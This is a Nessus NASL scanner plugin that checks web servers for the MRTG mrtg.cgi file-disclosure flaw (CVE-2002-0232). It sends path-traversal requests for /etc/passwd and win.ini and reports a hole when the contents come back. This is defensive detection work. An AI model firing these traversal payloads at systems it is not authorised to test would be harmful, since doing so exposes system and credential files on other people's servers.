#
# This script was written by H D Moore
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE


if(description)
{
 script_id(11001); 
 script_bugtraq_id(4017);

 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2002-0232");

 name["english"] = "MRTG mrtg.cgi File Disclosure";

 
 script_name(english:name["english"]);
 
 desc["english"] = "
The mrtg.cgi script is part of the MRTG traffic
visualization application. A vulnerability exists
in this script which allows an attacker to view the 
first line of any file on the system. 

Solution: Block access to this CGI

Risk factor : High 
";



 script_description(english:desc["english"]);
 
 summary["english"] = "checks for mrtg.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Digital Defense Inc.");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";

 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port)){ exit(0); }

foreach dir (cgi_dirs())
{
req_unx = string(dir, "/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd");
req_win = string(dir, "/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini");

str = http_get(item:req_unx, port:port);
r = http_keepalive_send_recv(port:port, data:str);
if( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
{
    security_hole(port);
    exit(0);
}


str = http_get(item:req_win, port:port);
r = http_keepalive_send_recv(port:port, data:str);
if( r == NULL ) exit(0);
if("[16-bit]" >< r)
 {
    security_hole(port:port);
    exit(0);
 }
}

